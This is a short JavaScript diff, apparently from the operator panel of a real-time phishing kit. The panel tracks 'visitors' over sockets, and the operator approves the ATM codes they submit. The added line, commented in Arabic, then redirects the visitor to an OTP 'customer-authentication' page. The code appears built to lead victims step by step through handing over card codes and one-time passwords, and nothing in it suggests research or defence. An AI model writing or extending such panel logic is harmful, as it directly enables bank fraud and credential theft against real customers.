@@ -2506,6 +2506,8 @@
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
+      // توجيه الزائر إلى صفحة OTP دخول بعد الموافقة على رمز ATM
+      navigateVisitorToPage(socketId, 'customer-authentication');
       // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
